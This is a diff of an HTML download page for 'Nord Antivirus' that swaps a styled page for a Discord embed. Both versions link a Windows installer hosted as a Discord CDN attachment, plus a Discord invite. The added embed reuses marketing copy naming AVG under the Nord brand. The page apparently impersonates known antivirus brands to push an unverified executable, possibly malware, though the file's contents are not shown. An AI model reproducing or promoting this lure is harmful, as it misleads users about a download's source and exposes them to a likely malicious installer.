@@ -5,104 +5,34 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Nord Antivirus - Sites</title>
     <link rel="icon" type="image/x-icon" href="https://cdn.discordapp.com/icons/1166413812606455838/81041ff5b1fe4dbeb9b3e657088bc91b.webp?size=480">
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            color: #ffffff;
-            background-image: url('https://img.freepik.com/free-vector/realistic-black-background-with-wavy-lines_23-2149167225.jpg');
-            background-size: cover;
-            background-repeat: no-repeat;
-            background-attachment: fixed;
-        }
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px;
-        }
-        .menu {
-            display: flex;
-            justify-content: flex-end;
-            align-items: center;
-            padding: 10px 20px;
-        }
-        .menu-item {
-            margin-left: 20px;
-            position: relative;
-            cursor: pointer;
-        }
-        .dropdown-content {
-            display: none;
-            position: absolute;
-            background-color: rgba(33, 33, 33, 0.8);
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
-            padding: 10px;
-            top: 30px;
-            z-index: 1;
-            transition: opacity 0.3s ease-in-out;
-        }
-        .menu-item:hover .dropdown-content {
-            display: block;
-            opacity: 1;
-        }
-        .dropdown-link {
-            color: #ffffff;
-            text-decoration: none;
-            display: block;
-            padding: 5px 10px;
-        }
-        .dropdown-link:hover {
-            background-color: rgba(255, 255, 255, 0.1);
-        }
-        .box {
-            background-color: rgba(33, 33, 33, 0.8);
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
-            padding: 20px;
-            margin-bottom: 20px;
-        }
-        h1 {
-            color: #ffffff;
-            font-size: 2.5rem;
-            margin-top: 0;
-        }
-        p {
-            color: #cccccc;
-            font-size: 1rem;
-            line-height: 1.5;
-        }
-    </style>
 </head>
 <body>
-    <div class="container">
-        <div class="menu">
-            <div class="menu-item">
-                <span>Support</span>
-                <div class="dropdown-content">
-                    <a href="#">Support Page</a>
-                    <a href="https://discord.gg/26Ye8dFp" class="dropdown-link">Discord Server</a>
-                </div>
-            </div>
-        </div>
-        <div class="box">
-            <h1>Nord Antivirus - Sites</h1>
-            <p>⚠️ Scroll down to see all downloads</p>
-        </div>
-        <div class="box">
-            <h2>Downloads</h2>
-            <div class="download">
-                <h3>Nord Antivirus (Windows)</h3>
-                <a href="https://cdn.discordapp.com/attachments/1193416262366281791/1201112839864188950/Nord_Antivirus-Setup-v1.43.exe?ex=65c8a280&is=65b62d80&hm=8dc1aa084aa8a413cb9a551675194b275d4aebce899b99e7167b97a365df65cb&" class="download-link">Click to download setup</a>
-            </div>
-        </div>
-        <div class="box">
-            <h2>Discord Server</h2>
-            <div class="download">
-                <a href="https://discord.gg/26Ye8dFp" class="download-link">Discord Server =&gt;</a>
-            </div>
-        </div>
+    <div id="root">
+        <!-- Your website content goes here -->
     </div>
+
+    <script type="application/json" id="discord-embed">
+        {
+            "embed": {
+                "title": "Nord Antivirus - Sites",
+                "description": "⚠️ Scroll down to see all downloads",
+                "color": 16753920,
+                "fields": [
+                    {
+                        "name": "Simple. Strong. Secure.",
+                        "value": "Stop viruses and other malware before they do damage, with AVG’s free computer virus protection software. AVG’s interfaces and tools are also clear and easy-to-use, so you’ll never waste any time navigating confusing menus."
+                    },
+                    {
+                        "name": "Downloads",
+                        "value": "[Nord Antivirus (Windows)](https://cdn.discordapp.com/attachments/1193416262366281791/1201112839864188950/Nord_Antivirus-Setup-v1.43.exe?ex=65c8a280&is=65b62d80&hm=8dc1aa084aa8a413cb9a551675194b275d4aebce899b99e7167b97a365df65cb&)"
+                    },
+                    {
+                        "name": "Discord Server",
+                        "value": "[Join the Discord Server](https://discord.gg/26Ye8dFp)"
+                    }
+                ]
+            }
+        }
+    </script>
 </body>
 </html>
